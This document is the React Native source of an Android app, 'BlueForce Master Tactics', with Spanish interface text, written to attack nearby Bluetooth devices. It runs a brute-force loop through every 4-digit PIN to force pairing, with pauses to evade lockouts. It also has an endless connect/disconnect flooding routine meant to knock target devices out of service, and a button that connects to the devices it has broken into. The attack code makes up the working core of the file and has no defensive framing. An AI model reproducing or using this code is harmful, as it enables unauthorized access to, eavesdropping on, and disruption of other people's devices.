import React, { useState, useEffect } from 'react';
import { 
  StyleSheet, 
  Text, 
  View, 
  TouchableOpacity, 
  ScrollView, 
  Alert, 
  PermissionsAndroid, 
  Platform, 
  FlatList, 
  ActivityIndicator 
} from 'react-native';
import RNBluetoothClassic from 'react-native-bluetooth-classic';

/**
 * BLUEFORCE HUD - TACTICAL EDITION
 * Motor de Disrupción Inalámbrica para Android
 */

const SignalMeter = ({ rssi }) => {
  let strength = 0;
  if (rssi > -50) strength = 5;
  else if (rssi > -65) strength = 4;
  else if (rssi > -75) strength = 3;
  else if (rssi > -85) strength = 2;
  else if (rssi > -100) strength = 1;

  const getColor = () => {
    if (strength >= 4) return '#00ff88';
    if (strength === 3) return '#ffea00';
    return '#ff3c00';
  };

  return (
    <View style={styles.meterContainer}>
      {[1, 2, 3, 4, 5].map(b => (
        <View 
          key={b} 
          style={[
            styles.bar, 
            { 
              height: b * 3, 
              backgroundColor: b <= strength ? getColor() : '#222',
              opacity: b <= strength ? 1 : 0.3
            }
          ]} 
        />
      ))}
    </View>
  );
};

export default function App() {
  const [discoveredDevices, setDiscoveredDevices] = useState([]);
  const [history, setHistory] = useState({});
  const [aliases, setAliases] = useState({});
  const [activeTarget, setActiveTarget] = useState(null);
  const [mode, setMode] = useState('IDLE');
  const [currentPin, setCurrentPin] = useState('0');
  const [logs, setLogs] = useState([]);
  const [isScanning, setIsScanning] = useState(false);

  const addLog = (msg) => {
    setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...prev].slice(0, 100));
  };

  const updateHistory = (mac, status, pin = null) => {
    setHistory(prev => ({ 
      ...prev, 
      [mac]: { status, pin, time: new Date().toLocaleTimeString() } 
    }));
  };

  const renameDevice = (mac, current) => {
    Alert.prompt(
      "ASIGNAR ALIAS",
      `Nombre táctico para ${current}`,
      [
        { text: "CANCELAR", style: "cancel" },
        { 
          text: "GUARDAR", 
          onPress: (newName) => {
            if (newName) {
              setAliases(prev => ({ ...prev, [mac]: newName.toUpperCase() }));
            }
          } 
        }
      ],
      "plain-text"
    );
  };

  useEffect(() => {
    (async () => {
      if (Platform.OS === 'android') {
        const granted = await PermissionsAndroid.requestMultiple([
          PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
          PermissionsAndroid.PERMISSIONS.BLUETOOTH_SCAN,
          PermissionsAndroid.PERMISSIONS.BLUETOOTH_CONNECT,
        ]);
        addLog("⚙️ Sistemas de radio en linea.");
      }
    })();
  }, []);

  const scan = async () => {
    if (isScanning || mode !== 'IDLE') return;
    setIsScanning(true);
    setDiscoveredDevices([]);
    addLog("📡 Iniciando barrido de señales...");
    try {
      const devices = await RNBluetoothClassic.startDiscovery();
      setDiscoveredDevices(devices.sort((a,b) => b.rssi - a.rssi));
      addLog(`🔍 Encontrados ${devices.length} objetivos.`);
    } catch (e) {
      addLog("⚠️ Error de radio: Hardware ocupado.");
    } finally {
      setIsScanning(false);
    }
  };

  const startBruteForce = async (device) => {
    setActiveTarget(device.address);
    setMode('BRUTE');
    updateHistory(device.address, '⚔️ ATACANDO');
    
    for (let i = 0; i <= 9999; i++) {
        let currentMode;
        setMode(prev => { currentMode = prev; return prev; });
        if (currentMode !== 'BRUTE') break;

        const pin = i.toString().padStart(4, '0');
        setCurrentPin(pin);
        
        try {
            await RNBluetoothClassic.pairDevice(device.address, { pin });
            await new Promise(r => setTimeout(r, 1500));
            
            const bonded = await RNBluetoothClassic.getBondedDevices();
            if (bonded.some(d => d.address === device.address)) {
                updateHistory(device.address, '🔓 CONQUISTADO', pin);
                addLog(`🎯 ÉXITO ABSOLUTO: ${pin}`);
                setMode('IDLE');
                setActiveTarget(null);
                Alert.alert("ÉXITO", `VÍNCULO REAL CONFIRMADO: ${pin}`);
                return;
            }

            if (i > 0 && i % 8 === 0) {
              addLog("⏲️ Enfriando objetivo...");
              await new Promise(r => setTimeout(r, 4000));
            }
        } catch (e) {
            await new Promise(r => setTimeout(r, 600));
        }
    }
    setMode('IDLE');
    setActiveTarget(null);
  };

  const startDisruptor = async (device) => {
    setActiveTarget(device.address);
    setMode('DISRUPTOR');
    updateHistory(device.address, '🔥 DISRUPCIÓN');
    addLog(`🔥 HELL-FLOODER activo contra ${device.address}`);
    
    while (true) {
      let currentMode;
      setMode(prev => { currentMode = prev; return prev; });
      if (currentMode !== 'DISRUPTOR') break;

      try {
        // ATAQUE MULTI-VECTOR DE SATURACIÓN
        RNBluetoothClassic.startDiscovery(); 
        
        await Promise.race([
          RNBluetoothClassic.connectDevice(device.address, { connectorType: "rfcomm", secure: false }),
          new Promise(r => setTimeout(r, 300)) 
        ]);
        
        await RNBluetoothClassic.cancelDiscovery();
        await RNBluetoothClassic.disconnectDevice(device.address);
      } catch (e) {
        // Fallar es el objetivo: significa que el socket está en estrés
      }
    }
    setMode('IDLE');
    setActiveTarget(null);
    addLog("⏹️ Operación finalizada.");
  };

  const renderItem = ({ item }) => {
    const h = history[item.address] || { status: '⚪ NUEVO' };
    const name = aliases[item.address] || item.name || "DESCONOCIDO";
    const isConquered = h.status.includes('🔓');
    const isThisActive = activeTarget === item.address;
    const isAnyActive = mode !== 'IDLE';

    return (
      <View style={[styles.card, isThisActive && { borderColor: '#00f2ff', borderWidth: 1 }]}>
        <SignalMeter rssi={item.rssi} />
        <TouchableOpacity 
          style={{ flex: 1, marginLeft: 15 }} 
          onPress={() => renameDevice(item.address, name)}
        >
          <Text style={styles.name}>{name}</Text>
          <Text style={styles.mac}>{item.address}</Text>
          <Text style={[styles.historyText, { color: isConquered ? '#00ff88' : '#888' }]}>
            {h.status} {h.pin ? `- PIN: ${h.pin}` : ''}
          </Text>
        </TouchableOpacity>
        <View style={{ flexDirection: 'row' }}>
          {isConquered ? (
            <TouchableOpacity 
              style={[styles.btnA, { backgroundColor: '#00f2ff' }]} 
              onPress={() => RNBluetoothClassic.connectDevice(item.address)}
            >
              <Text style={[styles.btnText, { color: '#000' }]}>AUD</Text>
            </TouchableOpacity>
          ) : (
            <>
              <TouchableOpacity 
                style={[styles.btnA, { opacity: isAnyActive ? 0.3 : 1 }]} 
                onPress={() => startBruteForce(item)} 
                disabled={isAnyActive}
              >
                <Text style={styles.btnText}>PIN</Text>
              </TouchableOpacity>
              <TouchableOpacity 
                style={[
                  styles.btnA, 
                  { backgroundColor: '#ff0055', marginLeft: 5, opacity: isAnyActive ? 0.3 : 1 }
                ]} 
                onPress={() => startDisruptor(item)} 
                disabled={isAnyActive}
              >
                <Text style={styles.btnText}>!BUG</Text>
              </TouchableOpacity>
            </>
          )}
        </View>
      </View>
    );
  };

  return (
    <View style={styles.container}>
      <Text style={styles.header}>BlueForce Master Tactics</Text>
      
      <View style={styles.statusPanel}>
        <Text style={styles.statusLabel}>
          {mode === 'IDLE' ? 'SISTEMA EN ESPERA' : `OPERACIÓN ACTIVA EN ${mode}`}
        </Text>
        <Text style={styles.pinDisplay}>{mode === 'IDLE' ? 'READY' : currentPin}</Text>
        <TouchableOpacity 
          style={[styles.scanBtn, (isScanning || mode !== 'IDLE') && { opacity: 0.2 }]} 
          onPress={scan} 
          disabled={isScanning || mode !== 'IDLE'}
        >
          {isScanning ? (
            <ActivityIndicator color="#000" />
          ) : (
            <Text style={styles.scanBtnText}>BARRIDO DE SEÑALES</Text>
          )}
        </TouchableOpacity>
      </View>

      <FlatList
        data={discoveredDevices}
        renderItem={renderItem}
        keyExtractor={i => i.address}
        style={{ flex: 1 }}
      />

      {mode !== 'IDLE' && (
        <TouchableOpacity 
          style={styles.stopBtn} 
          onPress={() => setMode('IDLE')}
        >
          <Text style={styles.stopText}>DETENER TODO</Text>
        </TouchableOpacity>
      )}

      <ScrollView style={styles.logBox}>
        {logs.map((l, i) => (
          <Text key={i} style={styles.logLine}>{l}</Text>
        ))}
      </ScrollView>
    </View>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#05070a', padding: 20, paddingTop: 40 },
  header: { color: '#00f2ff', fontSize: 22, fontWeight: 'bold', textAlign: 'center', marginBottom: 20 },
  statusPanel: { backgroundColor: '#10141d', padding: 20, borderRadius: 15, marginBottom: 20, borderBottomWidth: 3, borderBottomColor: '#00f2ff' },
  statusLabel: { color: '#555', fontSize: 10, textAlign: 'center', marginBottom: 5, fontFamily: 'monospace' },
  pinDisplay: { color: '#fff', fontSize: 42, fontWeight: 'bold', textAlign: 'center', marginBottom: 15, fontFamily: 'monospace' },
  scanBtn: { backgroundColor: '#00f2ff', padding: 15, borderRadius: 10, alignItems: 'center' },
  scanBtnText: { color: '#000', fontWeight: 'bold', fontSize: 13 },
  card: { backgroundColor: '#161a22', padding: 15, borderRadius: 12, marginBottom: 10, flexDirection: 'row', alignItems: 'center' },
  name: { color: '#fff', fontWeight: 'bold', fontSize: 13, textTransform: 'uppercase' },
  mac: { color: '#444', fontSize: 9 },
  historyText: { fontSize: 8, marginTop: 4, fontWeight: 'bold' },
  meterContainer: { flexDirection: 'row', alignItems: 'flex-end', width: 25 },
  bar: { width: 3, marginRight: 2, borderRadius: 1 },
  btnA: { backgroundColor: '#222', paddingVertical: 10, paddingHorizontal: 15, borderRadius: 8 },
  btnText: { color: '#fff', fontSize: 10, fontWeight: 'bold' },
  stopBtn: { backgroundColor: '#ff0055', padding: 15, borderRadius: 12, alignItems: 'center', marginBottom: 15 },
  stopText: { color: '#fff', fontWeight: 'bold', fontSize: 14 },
  logBox: { height: 100, backgroundColor: '#000', padding: 10, borderRadius: 10 },
  logLine: { color: '#333', fontSize: 8, marginBottom: 2 }
});
